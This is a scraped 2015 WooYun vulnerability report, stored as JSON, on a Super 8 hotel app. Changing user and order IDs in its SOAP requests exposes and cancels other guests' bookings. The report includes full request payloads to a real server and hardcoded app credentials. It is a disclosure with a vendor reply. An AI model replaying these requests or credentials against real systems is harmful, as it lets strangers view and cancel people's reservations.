{"id": 36098, "wybug_id": "wooyun-2015-0102623", "wybug_title": "速8酒店某APP越权可查询并取消他人订单", "wybug_corp": "速8酒店", "wybug_author": "深度安全实验室", "wybug_date": "2015-03-23 09:51", "wybug_open_date": "2015-05-10 22:14", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-10：\t细节向公众公开  简要描述： 本来只是查看别人的订单，后来发现还能取消~ 详细说明：  1.速8酒店APP下载地址：http://www.super8.com.cn/ 版本：v1.9.8   漏洞证明：  1.登陆后查询已有订单\nPOST /mobileInterface/Interface.asmx HTTP/1.1POST: /mobileInterface/Interface.asmx HTTP/1.1Content-Type: text/xml;charset=UTF-8HOST: 124.127.125.70SOAPAction: http://tempuri.org/NewGetMemberOrderListUser-Agent: Jakarta Commons-HttpClient/3.1Connection: Keep-AliveAccept-Encoding: gzipContent-Length: 541<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:tem=\"http://tempuri.org/\"><soap:Header><tem:AuthenticationToken><tem:Username>crs.iphone</tem:Username><tem:Password>crs.iphone.admin</tem:Password><tem:Ticks>1426839173570</tem:Ticks><tem:cKey>e338edd02e43a2f1c1188807dc48c7eb</tem:cKey></tem:AuthenticationToken></soap:Header><soap:Body><tem:NewGetMemberOrderList><tem:start>2015-03-10</tem:start><tem:end>2015-03-21</tem:end><tem:cardNo>306211822</tem:cardNo></tem:NewGetMemberOrderList></soap:Body></soap:Envelope>\n306211822为用户id，修改id后可以查看其他人订单\n\n2.然后进行订单取消操作，为了验证又申请了个注册号发送取消请求并拦截\nPOST /mobileInterface/Interface.asmx HTTP/1.1POST: /mobileInterface/Interface.asmx HTTP/1.1Accept-Encoding: gzip,deflateContent-Type: text/xml;charset=UTF-8SOAPAction: http://tempuri.org/CancelOrderUser-Agent: Jakarta Commons-HttpClient/3.1HOST: 124.127.125.70Connection: Keep-AliveContent-Length: 516<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">   <soapenv:Header>      <tem:AuthenticationToken>         <tem:Username>crs.iphone</tem:Username>         <tem:Password>crs.iphone.admin</tem:Password>      </tem:AuthenticationToken>   </soapenv:Header>   <soapenv:Body>      <tem:CancelOrder>         <tem:accId>31499316</tem:accId>         <tem:remark>Cancel By Client</tem:remark>      </tem:CancelOrder>   </soapenv:Body></soapenv:Envelope>\n<tem:accId>31499316</tem:accId>是订单号，通过刚才的查看其他用户的订单信息可以获取到相应订单号accid，在取消请求中修改订单号，就可以取消他人的订单了，系统会返回信息：操作成功，手机也会收到取消短信\n\n取消的都是自己注册的测试号码，不会影响正常业务   修复方案：  鉴权吧   版权声明：转载请注明来源 深度安全实验室@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-03-26 22:13 厂商回复： 谢谢提醒 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}